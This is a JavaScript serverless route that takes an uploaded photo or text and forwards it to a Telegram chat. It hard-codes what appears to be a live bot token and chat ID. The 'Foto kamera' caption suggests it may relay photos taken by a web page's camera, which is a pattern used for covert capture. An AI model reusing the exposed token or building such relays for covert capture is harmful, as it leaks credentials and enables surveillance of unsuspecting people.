import fetch from 'node-fetch';
import BUSBOY from 'busboy';

export const config = { api: { bodyParser: false } };

export default async function handler(req, res){
  if(req.method !== "POST") return res.status(405).send("Method Not Allowed");

  const botToken = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
  const chatId = "7483495590";

  const bb = BUSBOY({ headers: req.headers });
  let textMsg = "";
  let photoBuffer = null;

  bb.on("field", (name, val) => { if(name==="text") textMsg = val; });
  bb.on("file", (name, file) => {
    const chunks = [];
    file.on("data", data => chunks.push(data));
    file.on("end", ()=>{ photoBuffer = Buffer.concat(chunks); });
  });

  bb.on("finish", async ()=>{
    try{
      let resp;
      if(photoBuffer){
        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("caption", textMsg || "Foto kamera");
        form.append("photo", new Blob([photoBuffer]), "camera.jpg");

        resp = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method:"POST", body:form });
      }else{
        resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method:"POST",
          headers:{ "Content-Type":"application/json" },
          body: JSON.stringify({ chat_id: chatId, text: textMsg })
        });
      }
      res.status(200).json({ success:true });
    }catch(err){
      console.error(err);
      res.status(500).json({ success:false, error:err.message });
    }
  });

  req.pipe(bb);
}
